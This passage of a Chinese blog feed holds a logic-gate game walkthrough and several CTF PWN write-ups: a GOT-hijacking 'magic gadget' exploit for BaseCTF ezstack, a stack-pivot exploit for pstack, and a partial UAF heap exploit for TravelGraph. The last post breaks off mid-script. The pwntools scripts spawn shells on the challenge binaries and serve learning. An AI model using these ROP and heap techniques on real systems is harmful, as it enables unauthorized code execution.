    <content type="html"><![CDATA[<h2 id="原力觉醒"><a href="#原力觉醒" class="headerlink" title="原力觉醒"></a>原力觉醒</h2><p>只是想教会你如何连接导线</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%8E%9F%E5%8A%9B%E8%A7%89%E9%86%92.png" alt="原力觉醒"></p><h2 id="与非门"><a href="#与非门" class="headerlink" title="与非门"></a>与非门</h2><p>这一关要求玩家测试得出与非门（NAND）的真值表。什么是真值表？真值表其实就是输入和输出的对应关系。输入可以不止一个，在不同逻辑下，相同的输入可能会得到不同的输出。真值表可以让我们更直观地看出不同的逻辑关系。比如下图就是游戏中给出的与门（AND）的真值表。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="真值表"></p><p>回到这个关卡，题目已经给了我们与非门，我们只需要测试不同输入的情况下输出的情况，写在下方核对即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p>过关后，游戏告诉我们，利用这个元件可以造出电脑里的所有东西。</p><h2 id="非门"><a href="#非门" class="headerlink" title="非门"></a>非门</h2><p>非门就是我们常见的NOT，取反。题目要求我们利用与非门来搭建一个非门。<img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="非门真值表"></p><p>与非门有两个输入，但是非门只有一个输入。对比与非门的真值表我们可以很容易得出，当两个输入都是低电平的时候，输出为高电平，反之则为低电平。所以我们只要把输入同时给到与非门的两个接口，我们就能得到符合非门真值表的电路了。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8.png" alt="非门"></p><h2 id="与门"><a href="#与门" class="headerlink" title="与门"></a>与门</h2><p>这个逻辑我们很熟悉，AND。问题在于我们现在只有与非门和非门可以用。仔细观察与非门和与门的真值表可以发现，它们的输出完全反过来。所以我们只需要在输入给到与非门后取反即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%97%A8.png" alt="与门"></p><p>与门的性质就是，全真才为真。而与非门就可以理解为，与后非，即全假才为真。</p><h2 id="或门"><a href="#或门" class="headerlink" title="或门"></a>或门</h2><p>或门也是我们熟悉的OR，有真即为真。我们对比一下与非门和或门的真值表，会发现他们的输出刚好左右对称。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="或门真值表"></p><p>这里就要引出数电中很基础的一个定理：德摩根定律。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%BE%B7%E6%91%A9%E6%A0%B9%E5%AE%9A%E5%BE%8B.png" alt="德摩根定律"></p><p>通俗点来讲就是，如果我们在输入的时候就取反，那么输出就会呈左右对称。如果我们在输出取反，那么输出会分别取反。回到这道题，我们只需要在与非门的输入（元件左边）取反，就能得到或门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8.png" alt="或门"></p><h2 id="或非门"><a href="#或非门" class="headerlink" title="或非门"></a>或非门</h2><p>NOR，类比一下与非门的命名逻辑，显然或非门就是或后非。所以只要在或门后面的输出加上非门即可。这也是为什么前面先讲了或门，才来讲或非门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%9D%9E%E9%97%A8.png" alt="或非门"></p>]]></content>
    
    
    <summary type="html">开启计组学习的新大门</summary>
    
    
    
    <category term="图灵完备" scheme="https://c-lby.top/categories/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    
    <category term="图灵完备，计组" scheme="https://c-lby.top/tags/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87%EF%BC%8C%E8%AE%A1%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>没有输出函数的情况下magic_gadget的利用</title>
    <link href="https://c-lby.top/2024/09/13/magic-gadget/"/>
    <id>https://c-lby.top/2024/09/13/magic-gadget/</id>
    <published>2024-09-13T06:29:45.000Z</published>
    <updated>2024-09-20T08:29:09.263Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是magic-gadget"><a href="#什么是magic-gadget" class="headerlink" title="什么是magic_gadget"></a>什么是magic_gadget</h3><p>magic gadget其实是一类gadget的统称，指可以巧妙地实现某些目的的gadget。这里要讲的gadget只是众多magic gadget中的其中一个，可以在没法泄露libc地址的时候达到能够使用libc地址的目的。</p><p>这里要讲的gadget位于程序的<code>__do_global_dtors_aux</code>函数中，偏移是0x18。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add     [rbp-3Dh], ebx</span><br></pre></td></tr></table></figure><p>在IDA正常反编译下是看不到这个gadget的，只有重新在0x18处反汇编才能看到。显然，这个gadget可以实现在某一个栈上数据加上一个偏移。假如在rbp-0x3D处存在一个libc地址，并且这个地址每次运行都是一样的（相对偏移），那么我就可以通过控制ebx寄存器，使用这个gadget把那个libc地址变成ogg或者system，从而返回获得一个shell。</p><p>但是很显然，rbp-0x3D很难直接是一个返回地址，就算是被调用者的返回地址，也会被覆盖。</p><p>如果能知道栈地址，劫持rbp进行栈迁移也许是个不错的选择，但是本来就是在没法泄露地址的情况（一般是连输出函数都没有但是又有栈溢出的情况），所以这个压根没机会。比较常见的使用方法是：</p><ol><li>如果没有开full relro，劫持rbp到got表，修改got表后进行rop。</li><li>如果没有开地址随机化，可以栈迁移到bss段，然后调用libc_start_main在bss段上留下libc地址，然后再劫持rbp到那个地址的相应偏移处（依然在bss），修改某个libc地址为ogg或者system后ROP。</li></ol><h3 id="2024-BaseCTF-ezstack"><a href="#2024-BaseCTF-ezstack" class="headerlink" title="2024 BaseCTF ezstack"></a>2024 BaseCTF ezstack</h3><p>这道题，爱来自gets师傅（</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序除了一个gets函数之外就什么都没有了。没有输出函数。靶机环境是2.35的，但是程序里出现了csu，这应该是出题人故意留的gadget（爱来自gets），刚好符合上面讲到的无输出函数的情况。我们来详细分析一下这题的做题步骤。</p><p>首先检查程序的保护情况，发现PIE没开，partial relro，所以优先考虑劫持got表。got表中可以供我们选择的函数并不多，gets函数我们还需要用它来传payload和binsh字符串，所以我们劫持setvbuf这个函数为system。</p><p>已经确定要使用<code>add     [rbp-3Dh], ebx</code>这个gadget，先看我们需要控制什么寄存器。首先rbp需要劫持为setvbuf的got表地址+0x3D，ebx应该存setvbuf与system两个函数在libc中的偏移，这样我们就能通过add将setvbuf的got表指向system。</p><p>我们利用ret2csu来控制寄存器，实际上我们只需要其中一段就够了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006EA                 pop     rbx</span><br><span class="line">.text:00000000004006EB                 pop     rbp</span><br><span class="line">.text:00000000004006EC                 pop     r12</span><br><span class="line">.text:00000000004006EE                 pop     r13</span><br><span class="line">.text:00000000004006F0                 pop     r14</span><br><span class="line">.text:00000000004006F2                 pop     r15</span><br><span class="line">.text:00000000004006F4                 retn</span><br></pre></td></tr></table></figure><p>前面两个就已经能够控制rbx和rbp了，其他都无所谓。于是写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span> <span class="comment">#setvbuf和system之间的偏移，注意符号</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure><p>buf_address处实际上写什么都无所谓。关于偏移的计算，可以手动在libc中查找后计算，也可以借助pwndbg来进行计算</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p setvbuf</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;int (FILE *, char *, int, size_t)&#125; 0x7fb610a4b5f0 &lt;__GI__IO_setvbuf&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;int (const char *)&#125; 0x7fb610a1ad70 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">distance 0x7fb610a4b5f0 0x7fb610a1ad70</span></span><br><span class="line"><span class="meta prompt_">0x7fb610a4b5f0-&gt;</span><span class="language-bash">0x7fb610a1ad70 is -0x30880 bytes (-0x6110 words)</span></span><br></pre></td></tr></table></figure><p>设置好寄存器之后就执行magic gadget。然后这时候setvbuf的got表就已经变成了system了，我们断点动调看看。<img src="https://c-lby.top/images/magic_gadget/%E5%8A%AB%E6%8C%81%E5%90%8E%E7%9A%84got%E8%A1%A8.png" alt="劫持后的got表"></p><p>确实劫持成功了。那接下来就是正常的ROP了，我们先利用gets函数把binsh写进到bss段，然后再传参执行system即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 30854)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4006EA</span></span><br><span class="line">gadget_call = <span class="number">0x4006D0</span></span><br><span class="line">magic_gadget = <span class="number">0x4005D8</span></span><br><span class="line">rdi = <span class="number">0x4006f3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006f1</span></span><br><span class="line">leave_ret = <span class="number">0x40068c</span></span><br><span class="line">buf_address = e.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x400700</span></span><br><span class="line">init = <span class="number">0x400690</span></span><br><span class="line">main = <span class="number">0x40065D</span></span><br><span class="line"></span><br><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">18446744073709352832</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;setvbuf&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">爱来自gets师傅</summary>
    
    
    
    <category term="magic_gadget" scheme="https://c-lby.top/categories/magic-gadget/"/>
    
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="magic_gadget" scheme="https://c-lby.top/tags/magic-gadget/"/>
    
  </entry>
  
  <entry>
    <title>『2024羊城杯初赛』 PWN WP</title>
    <link href="https://c-lby.top/2024/09/02/2024ycb-wp/"/>
    <id>https://c-lby.top/2024/09/02/2024ycb-wp/</id>
    <published>2024-09-02T03:16:32.000Z</published>
    <updated>2024-09-20T07:12:39.602Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>非常经典的没有回显的0x10字节溢出，栈迁移。第一件事就要先考虑怎么泄露出libc地址。我们选择将栈劫持到bss段。从汇编代码可知vuln函数栈帧开辟了0x30大小，所以把rbp劫持为某个选定的bss段+0x30，这样rbp就会跳到bss+0x30。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B5.png" alt="pstack_rbp迁移到bss段"></p><p>因为read函数是通过<code>lea    rax, [rbp - 0x30]</code>寻址的，所以下一次read的时候payload会被写到0x601818。我们直接在这个地址上写泄露libc地址的ropchain，然后在rbp的地址处写上0x601810的话，rbp就会被劫持到那，这样经过一次leave ret之后就会从0x601850开始执行了。在这里写上leave ret，就能将rsp劫持到0x601818开始执行ropchain。这里需要注意一点是，一定要多执行一个mov rbp，rsp恢复一下两个的位置关系，因为这会rbp是0，不恢复的话后面的read没法寻址。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B52.png" alt="pstack_rbp迁移到bss段2"></p><p>泄露出来libc之后后面写system的ropchain就和前面的思路一样了。也是执行两次read两次leave ret后执行ropchain。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = e.bss()+<span class="number">0x808</span></span><br><span class="line">leave_ret = <span class="number">0x4006DB</span></span><br><span class="line">vuln = <span class="number">0x4006b0</span></span><br><span class="line">vuln_sub_30 = <span class="number">0x4006B4</span></span><br><span class="line">rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x4006DC</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss+<span class="number">0x30</span>)+p64(vuln_sub_30)</span><br><span class="line">payload1 = p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)+p64(rdi)+p64(binsh)+p64(system)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><a href="https://blog.csdn.net/qq_44431690/article/details/108175827">Dijkstra算法学习</a></p><p>开了沙盒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>那就走正常的orw。因为是2.35堆题，所以经典的apple2+setcontext+orw的组合。第一次调板子，好好分析一下这题。</p><p>审计代码发现delete的时候只清空了堆内对于城市名字记录的内容，没有清空route数组中地址的储存，所以有UAF漏洞。</p><h5 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;&#x27;,)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;. Calculate the distance.&quot;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">vehicle, start, destination, far, note</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;What kind of transportation do you want? car/train/plane?&quot;</span>, vehicle)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">start, destination, idx, far, note</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Which one do you want to change?&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dj</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    r.sendline(name)</span><br></pre></td></tr></table></figure><p>这道题因为开了沙盒，所以程序在初始化的时候就已经申请并且释放了很多堆到tcachebin甚至fastbin中，所以布局的时候需要注意。但是这道题里申请的堆至少是0x520大小的，所以一般情况下其实也不会涉及到tcachebin。</p><h5 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h5><p>这个show函数打印的内容是chunk+8和chunk+0x10两个地方，但是如果free之后，虽然有uaf，但是清空了堆里的城市名字之后，会识别不到相应的chunk，所以必须只能申请了释放掉再申请才能打印，这样一来，chunk+8的位置又被覆盖了。但是如果chunk进入了largebin，就会在chunk+0x10和0x18的地方留下堆地址，这里不会被覆盖。所以只要将chunk+0x10填满8字节就能把0x18处的堆地址带出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br></pre></td></tr></table></figure><h5 id="关于edit功能"><a href="#关于edit功能" class="headerlink" title="关于edit功能"></a>关于edit功能</h5><p>edit这里有两个限制，一个是只能edit一次，第二是需要手动赋予edit的机会。第二个限制需要通过Dijkstra算法计算满足总路程超过2000才能有edit机会。所以我们在add的时候还要考虑路径要连得上，并且距离给大一点（不能超过1000）。</p><p>所以在刚刚泄露堆地址的时候就把这个考虑进去，修改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span 